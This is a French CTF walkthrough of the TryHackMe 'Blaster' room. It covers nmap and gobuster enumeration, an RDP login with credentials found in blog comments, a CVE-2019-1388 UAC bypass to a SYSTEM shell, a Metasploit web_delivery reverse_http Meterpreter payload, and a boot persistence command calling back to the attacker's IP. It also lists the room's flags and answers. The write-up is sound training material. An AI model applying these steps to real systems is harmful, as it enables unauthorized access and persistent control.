# TryHackMe: Blaster

**Objectif :** enumerer le serveur IIS, identifier le blog cache, recuperer des identifiants a partir des commentaires du site, obtenir un acces RDP sur la machine Windows, elever les privileges jusqu'a `NT AUTHORITY\SYSTEM`, puis mettre en place une session Meterpreter et une persistence simple.

---

## Introduction

La room **Blaster** est la suite logique de **Ice** et une version simplifiee de **Retro**. Elle est tres utile pour travailler deux axes differents :

- exploitation "sans gros outil" a partir d'indices laisses sur un site web
- post-exploitation Windows via UAC bypass et Metasploit

La room est guidee, donc je reprends ici les questions officielles une par une, avec la logique complete qui mene a chaque reponse.

---

## Task 1: Mission Start!

### Question 1: Deploy the machine! This is a Windows box so give it a few minutes (3-5 at max) to come online

Je deploie simplement la cible depuis la room et j'attends qu'elle soit reachable avant de commencer les scans.

### Reponse

`Done`

---

## Task 2: Activate Forward Scanners and Launch Proton Torpedoes

Le but de cette partie est de faire toute l'enumeration initiale sans partir trop vite sur de l'exploitation.

### Question 1: How many ports are open on our target system?

Je commence avec Nmap :

```bash
nmap -Pn -sS -sV -sC <IP>
```

Le scan fait ressortir deux ports ouverts :

- `80/tcp` - Microsoft IIS
- `3389/tcp` - Remote Desktop Protocol

### Reponse

**How many ports are open?** `2`

### Question 2: Looks like there's a web server running, what is the title of the page we discover when browsing to it?

Le titre de la page d'accueil ressort deja dans Nmap :

```text
IIS Windows Server
```

On le retrouve aussi en ouvrant le site dans le navigateur.

### Reponse

**Page title:** `IIS Windows Server`

### Question 3: Interesting, let's see if there's anything else on this web server by fuzzing it. What hidden directory do we discover?

La page par defaut IIS ne donne rien d'utile. Je passe donc a un bruteforce de repertoires :

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Ou avec `dirsearch` / `ffuf` selon les habitudes.

Le repertoire decouvert est :

```text
/retro
```

### Reponse

**Hidden directory:** `/retro`

### Question 4: Navigate to our discovered hidden directory, what potential username do we discover?

En explorant le blog present dans `/retro/`, on constate que tous les articles sont signes par le meme auteur :

```text
Wade
```

### Reponse

**Potential username:** `Wade`

### Question 5: Crawling through the posts, it seems like our user has had some difficulties logging in recently. What possible password do we discover?

Dans les commentaires du blog, Wade laisse un memo tres explicite a propos de son mot de passe :

```text
Parzival
```

Certaines sources l'ecrivent en minuscule selon le client utilise, mais la room valide :

```text
Parzival
```

### Reponse

**Possible password:** `Parzival`

### Question 6: Log into the machine via Microsoft Remote Desktop (MSRDP) and read user.txt. What are it's contents?

Je teste les credentials trouves sur RDP :

```bash
xfreerdp /u:Wade /p:Parzival /v:<IP>
```

La connexion reussit. Une fois sur le bureau, le flag utilisateur est directement visible.

```cmd
type C:\Users\Wade\Desktop\user.txt
```

### Reponse

**user.txt:** `THM{HACK_PLAYER_ONE}`

---

## Task 3: Breaching the Control Room

Maintenant que j'ai un acces graphique sur la machine, je passe a la privilege escalation.

### Question 1: When enumerating a machine, it's often useful to look at what the user was last doing. Look around the machine and see if you can find the CVE which was researched on this server. What CVE was it?

Je regarde ce qui peut trahir l'activite recente de Wade :

- historique navigateur
- fichiers telecharges
- corbeille
- raccourcis
- bureau

On trouve rapidement une reference claire a :

```text
CVE-2019-1388
```

### Reponse

**CVE:** `CVE-2019-1388`

### Question 2: Looks like an executable file is necessary for exploitation of this vulnerability and the user didn't really clean up very well after testing it. What is the name of this executable?

Le binaire laisse par l'utilisateur est :

```text
hhupd
```

On le retrouve en pratique soit sur le bureau, soit dans la corbeille.

### Reponse

**Executable name:** `hhupd`

### Question 3: Research vulnerability and how to exploit it. Exploit it now to gain an elevated terminal!

Le principe du contournement UAC est le meme que dans beaucoup de writeups de **Retro** :

1. lancer `hhupd.exe` en administrateur
2. afficher les details supplementaires
3. ouvrir les informations du certificat editeur
4. cliquer sur le lien qui ouvre un navigateur en contexte eleve
5. depuis le navigateur, faire `Save As`
6. dans la boite de dialogue, taper `C:\Windows\System32\cmd.exe`

Si aucun navigateur non privilegie n'est deja ouvert, cette chaine permet d'obtenir une invite de commande avec des privileges eleves.

### Reponse

`Done`

### Question 4: Now that we've spawned a terminal, let's go ahead and run the command 'whoami'. What is the output of running this?

Je confirme le contexte :

```cmd
whoami
```

Le resultat est :

```text
nt authority\system
```

### Reponse

**whoami:** `nt authority\system`

### Question 5: Now that we've confirmed that we have an elevated prompt, read the contents of root.txt on the Administrator's desktop. What are the contents?

Je lis ensuite le flag root :

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

### Reponse

**root.txt:** `THM{COIN_OPERATED_EXPLOITATION}`

---

## Task 4: Adoption into the Collective

Cette derniere partie bascule sur Metasploit pour obtenir une session Meterpreter, puis regarder rapidement la persistence.

### Question 1: Return to your attacker machine for this next bit. Since we know our victim machine is running Windows Defender, let's go ahead and try a different method of payload delivery! For this, we'll be using the script web delivery exploit within Metasploit. Launch Metasploit now and select 'exploit/multi/script/web_delivery' for use.

Je lance :

```text
msfconsole
use exploit/multi/script/web_delivery
```

### Reponse

`Done`

### Question 2: First, let's set the target to PSH (PowerShell). Which target number is PSH?

Je verifie les cibles disponibles :

```text
show targets
```

La sortie donne :

```text
2   PSH
```

### Reponse

**PSH target number:** `2`

### Question 3: After setting your payload, set your lhost and lport accordingly such that you know which port the MSF web server is going to run on and that it'll be running on the TryHackMe network.

Je configure les options utiles :

```text
set target 2
set LHOST <MON_IP_THM>
set LPORT 1234
```

Je peux garder `SRVHOST` et `SRVPORT` par defaut si rien n'entre en conflit.

### Reponse

`Done`

### Question 4: Finally, let's set our payload. In this case, we'll be using a simple reverse HTTP payload. Do this now with the command: 'set payload windows/meterpreter/reverse_http'. Following this, launch the attack as a job with the command 'run -j'.

Je poursuis avec :

```text
set payload windows/meterpreter/reverse_http
run -j
```

Metasploit demarre alors le serveur web de livraison et affiche une commande PowerShell a executer sur la machine cible.

### Reponse

`Done`

### Question 5: Return to the terminal we spawned with our exploit. In this terminal, paste the command output by Metasploit after the job was launched.

Je copie la commande PowerShell fournie par Metasploit dans le terminal SYSTEM deja ouvert sur la cible. La session Meterpreter se connecte alors sur la machine d'attaque.

### Reponse

`Done`

### Question 6: Last but certainly not least, let's look at persistence mechanisms via Metasploit. What command can we run in our meterpreter console to setup persistence which automatically starts when the system boots? Don't include anything beyond the base command and the option for boot startup.

La reponse attendue dans la room est la commande de base :

```text
run persistence -X
```

`-X` indique que la persistence doit etre declenchee au boot.

### Reponse

**Persistence command:** `run persistence -X`

### Question 7: Run this command now with options that allow it to connect back to your host machine should the system reboot.

Une execution typique ressemble a ceci :

```text
run persistence -X -i 10 -p 4444 -r <MON_IP_THM>
```

Ensuite, il faudrait en pratique lancer un handler adapte pour recevoir le callback apres redemarrage.

### Reponse

`Done`

---

## Resume des reponses de la room

- Deploy the machine `Done`
- How many ports are open on our target system? `2`
- Looks like there's a web server running, what is the title of the page we discover when browsing to it? `IIS Windows Server`
- What hidden directory do we discover? `/retro`
- What potential username do we discover? `Wade`
- What possible password do we discover? `Parzival`
- What are the contents of user.txt? `THM{HACK_PLAYER_ONE}`
- What CVE was researched on this server? `CVE-2019-1388`
- What is the name of this executable? `hhupd`
- Exploit it now to gain an elevated terminal `Done`
- What is the output of running whoami? `nt authority\system`
- What are the contents of root.txt? `THM{COIN_OPERATED_EXPLOITATION}`
- Launch `exploit/multi/script/web_delivery` `Done`
- Which target number is PSH? `2`
- Set lhost and lport `Done`
- Set payload and run as a job `Done`
- Paste the generated PowerShell command and catch the shell `Done`
- Persistence command for boot startup `run persistence -X`
- Run it with your own listener parameters `Done`

---

## Commandes importantes et explication

### Enumeration initiale

```bash
nmap -Pn -sS -sV -sC <IP>
```

Montre qu'on a seulement `80` et `3389`, ce qui rend la correlation web + RDP tres naturelle.

### Fuzzing web

```bash
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
```

Fait apparaitre `/retro`.

### Connexion RDP

```bash
xfreerdp /u:Wade /p:Parzival /v:<IP>
```

Permet de transformer l'indice du blog en acces reel a la machine.

### Verification du contexte eleve

```cmd
whoami
```

Confirme que l'UAC bypass a bien donne un shell SYSTEM.

### Livraison PowerShell via Metasploit

```text
use exploit/multi/script/web_delivery
set target 2
set payload windows/meterpreter/reverse_http
run -j
```

Permet de passer d'un simple terminal local a une session Meterpreter exploitable a distance.

### Persistence

```text
run persistence -X
```

Montre le mecanisme demande par la room pour demarrer automatiquement au boot.

---

## Raisonnement complet

La room est simple, mais elle reste tres instructive parce qu'elle montre un enchainement coherent :

1. le site par defaut IIS semble inutile
2. le repertoire cache revele un blog
3. le blog fournit un nom d'utilisateur
4. un commentaire divulgue le mot de passe
5. RDP donne un premier acces fiable
6. l'activite recente de l'utilisateur pointe vers la bonne CVE
7. le binaire deja present rend l'exploitation locale immediate
8. Metasploit sert ensuite a industrialiser l'acces et la persistence

Autrement dit, on part d'un simple indice textuel sur un blog pour finir en SYSTEM avec persistence. C'est une progression tres utile a documenter.

---

## Conclusion

**Blaster** est une bonne room de transition entre les machines d'initiation web et les premiers scenarios Windows complets. Elle montre qu'un detail anodin dans un commentaire peut suffire a ouvrir la porte, puis qu'un poste mal nettoye peut rendre la privilege escalation presque triviale.

***Auteur*** *: Saad Idrissi*
